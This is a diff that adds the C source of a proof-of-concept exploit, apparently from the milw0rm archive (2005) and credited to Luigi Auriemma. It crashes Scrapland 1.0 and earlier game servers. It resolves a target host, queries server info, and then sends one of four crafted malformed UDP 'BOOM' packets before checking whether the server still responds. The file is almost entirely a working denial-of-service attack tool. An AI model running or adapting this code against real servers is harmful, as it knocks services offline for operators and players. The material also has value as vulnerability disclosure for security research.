@@ -1,0 +1,293 @@
+/*
+
+by Luigi Auriemma
+
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <time.h>
+
+#ifdef WIN32
+    #include <winsock.h>
+/*
+   Header file used for manage errors in Windows
+   It support socket and errno too
+   (this header replace the previous sock_errX.h)
+*/
+
+#include <string.h>
+#include <errno.h>
+
+
+
+void std_err(void) {
+    char    *error;
+
+    switch(WSAGetLastError()) {
+        case 10004: error = "Interrupted system call"; break;
+        case 10009: error = "Bad file number"; break;
+        case 10013: error = "Permission denied"; break;
+        case 10014: error = "Bad address"; break;
+        case 10022: error = "Invalid argument (not bind)"; break;
+        case 10024: error = "Too many open files"; break;
+        case 10035: error = "Operation would block"; break;
+        case 10036: error = "Operation now in progress"; break;
+        case 10037: error = "Operation already in progress"; break;
+        case 10038: error = "Socket operation on non-socket"; break;
+        case 10039: error = "Destination address required"; break;
+        case 10040: error = "Message too long"; break;
+        case 10041: error = "Protocol wrong type for socket"; break;
+        case 10042: error = "Bad protocol option"; break;
+        case 10043: error = "Protocol not supported"; break;
+        case 10044: error = "Socket type not supported"; break;
+        case 10045: error = "Operation not supported on socket"; break;
+        case 10046: error = "Protocol family not supported"; break;
+        case 10047: error = "Address family not supported by protocol family"; break;
+        case 10048: error = "Address already in use"; break;
+        case 10049: error = "Can't assign requested address"; break;
+        case 10050: error = "Network is down"; break;
+        case 10051: error = "Network is unreachable"; break;
+        case 10052: error = "Net dropped connection or reset"; break;
+        case 10053: error = "Software caused connection abort"; break;
+        case 10054: error = "Connection reset by peer"; break;
+        case 10055: error = "No buffer space available"; break;
+        case 10056: error = "Socket is already connected"; break;
+        case 10057: error = "Socket is not connected"; break;
+        case 10058: error = "Can't send after socket shutdown"; break;
+        case 10059: error = "Too many references, can't splice"; break;
+        case 10060: error = "Connection timed out"; break;
+        case 10061: error = "Connection refused"; break;
+        case 10062: error = "Too many levels of symbolic links"; break;
+        case 10063: error = "File name too long"; break;
+        case 10064: error = "Host is down"; break;
+        case 10065: error = "No Route to Host"; break;
+        case 10066: error = "Directory not empty"; break;
+        case 10067: error = "Too many processes"; break;
+        case 10068: error = "Too many users"; break;
+        case 10069: error = "Disc Quota Exceeded"; break;
+        case 10070: error = "Stale NFS file handle"; break;
+        case 10091: error = "Network SubSystem is unavailable"; break;
+        case 10092: error = "WINSOCK DLL Version out of range"; break;
+        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
+        case 10071: error = "Too many levels of remote in path"; break;
+        case 11001: error = "Host not found"; break;
+        case 11002: error = "Non-Authoritative Host not found"; break;
+        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
+        case 11004: error = "Valid name, no data record of requested type"; break;
+        default: error = strerror(errno); break;
+    }
+    fprintf(stderr, "\nError: %s\n", error);
+    exit(1);
+}
+
+    #define close   closesocket
+    #define ONESEC  1000
+#else
+    #include <unistd.h>
+    #include <sys/socket.h>
+    #include <sys/types.h>
+    #include <arpa/inet.h>
+    #include <netinet/in.h>
+    #include <netdb.h>
+
+    #define ONESEC  1
+#endif
+
+
+
+#define VER         "0.1"
+#define BUFFSZ      2048
+#define PORT        28086
+#define TIMEOUT     3
+
+#define SEND(x,y)   if(sendto(sd, x, y, 0, (struct sockaddr *)&peer, sizeof(peer)) \
+                      < 0) std_err();
+#define RECV        if(timeout(sd) < 0) { \
+                        fputs("\nError: socket timeout, no reply received\n\n", stdout); \
+                        exit(1); \
+                    } \
+                    len = recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL); \
+                    if(len < 0) std_err();
+#define ADDSHORT(x) *(u_short *)p = x; \
+                    p += 2;
+#define ADDLONG(x)  *(u_long *)p = x; \
+                    p += 4;
+#define ADDTEXT(x)  *p++ = sizeof(x) - 1; \
+                    memcpy(p, x, sizeof(x) - 1); \
+                    p += sizeof(x) - 1;
+
+
+
+int timeout(int sock);
+u_long resolv(char *host);
+void std_err(void);
+
+
+
+int main(int argc, char *argv[]) {
+    struct  sockaddr_in peer;
+    int     sd,
+            len;
+    u_short port = PORT;
+    u_char  buff[BUFFSZ],
+            info[] =
+                "\x7f"
+                "\x01\x00"
+                "\x00\x07",
+            pck[] =
+                "\x7f"
+                "\x00\x00"
+                "\x00\x00"
+                "\x00",
+            *p;
+
+
+    setbuf(stdout, NULL);
+
+    fputs("\n"
+        "Scrapland <= 1.0 server termination "VER"\n"
+        "by Luigi Auriemma\n"
+        "e-mail: aluigi@autistici.org\n"
+        "web:    http://aluigi.altervista.org\n"
+        "\n", stdout);
+
+    if(argc < 3) {
+        printf("\n"
+            "Usage: %s <attack> <host> [port(%d)]\n"
+            "\n"
+            "Attack:\n"
+            " 1 = big text string (size>SSize)\n"
+            " 2 = unexistent models (you can test this bug also modifying scrap.cfg)\n"
+            " 3 = newpos<=size\n"
+            " 4 = partial packet after small packet (1 or 2 bytes)\n"
+            "\n", argv[0], port);
+        exit(1);
+    }
+
+#ifdef WIN32
+    WSADATA    wsadata;
+    WSAStartup(MAKEWORD(1,0), &wsadata);
+#endif
+
+    if(argc > 3) port = atoi(argv[3]);
+
+    peer.sin_addr.s_addr  = resolv(argv[2]);
+    peer.sin_port         = htons(port);
+    peer.sin_family       = AF_INET;
+
+    printf("- target   %s : %hu\n",
+        inet_ntoa(peer.sin_addr), port);
+
+    fputs("- request informations\n", stdout);
+    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    if(sd < 0) std_err();
+    SEND(info, sizeof(info) - 1);
+    RECV;
+    printf("\n  Server name   %s\n", buff + 10);
+    printf("  Players       %d / %d\n\n",
+        *(u_short *)(buff + 8), *(u_short *)(buff + 6));
+
+    if(*(u_short *)(buff + 8) == *(u_short *)(buff + 6)) {
+        fputs("- Alert: the server is full so this attack will fail\n\n", stdout);
+    }
+
+    fputs("- send BOOM packet\n", stdout);
+    switch(atoi(argv[1])) {
+        case 1: {
+            pck[5] = 0xff;              // major than 0x7f
+            *(u_short *)(pck + 1) = sizeof(pck) - 4;
+            SEND(pck, sizeof(pck) - 1);
+            } break;
+        case 2: {
+            p = buff;
+            *p++ = 0x7f;
+            p += 2;                     // data size
+            ADDSHORT(0);                // don't know, pck related?
+            ADDTEXT("Unnamed Player");  // PlayerName
+            ADDTEXT("unexistent");      // PlayerModel
+            ADDSHORT(65);               // PlayerMaxLife
+            ADDTEXT("unexistent");      // PilotModel
+            ADDTEXT("unexistent");      // Motor0Model
+            ADDTEXT("unexistent");      // Motor1Model
+            ADDTEXT("unexistent");      // Motor2Model
+            ADDTEXT("unexistent");      // Motor3Model
+            ADDTEXT("1,3,0,0,1,0,1");   // WeaponBayList
+            ADDLONG(0);                 // PlayerTeamID
+            *(u_short *)(buff + 1) = (p - buff) - 3;
+
+            SEND(buff, p - buff);
+            } break;
+        case 3: {
+            *(u_short *)(pck + 1) = 1;  // major than 0
+            SEND(pck, 5);
+            } break;
+        case 4: {
+            SEND(pck, 1);
+            sleep(ONESEC);
+            *(u_short *)(pck + 1) = 0;
+            SEND(pck, 3);
+            } break;
+        default: {
+            fputs("\nError: wrong attack selected\n\n", stdout);
+            exit(1);
+            }
+    }
+
+    fputs("- check server:\n", stdout);
+    SEND(info, sizeof(info) - 1);
+    if(timeout(sd) < 0) {
+        fputs("\nServer IS vulnerable!!!\n\n", stdout);
+    } else {
+        fputs("\nServer doesn't seem vulnerable\n\n", stdout);
+    }
+
+    close(sd);
+    return(0);
+}
+
+
+
+int timeout(int sock) {
+    struct  timeval tout;
+    fd_set  fd_read;
+    int     err;
+
+    tout.tv_sec = TIMEOUT;
+    tout.tv_usec = 0;
+    FD_ZERO(&fd_read);
+    FD_SET(sock, &fd_read);
+    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
+    if(err < 0) std_err();
+    if(!err) return(-1);
+    return(0);
+}
+
+
+
+u_long resolv(char *host) {
+    struct hostent *hp;
+    u_long host_ip;
+
+    host_ip = inet_addr(host);
+    if(host_ip == INADDR_NONE) {
+        hp = gethostbyname(host);
+        if(!hp) {
+            printf("\nError: Unable to resolv hostname (%s)\n", host);
+            exit(1);
+        } else host_ip = *(u_long *)hp->h_addr;
+    }
+    return(host_ip);
+}
+
+
+
+#ifndef WIN32
+    void std_err(void) {
+        perror("\nError");
+        exit(1);
+    }
+#endif
+
+// milw0rm.com [2005-02-28]
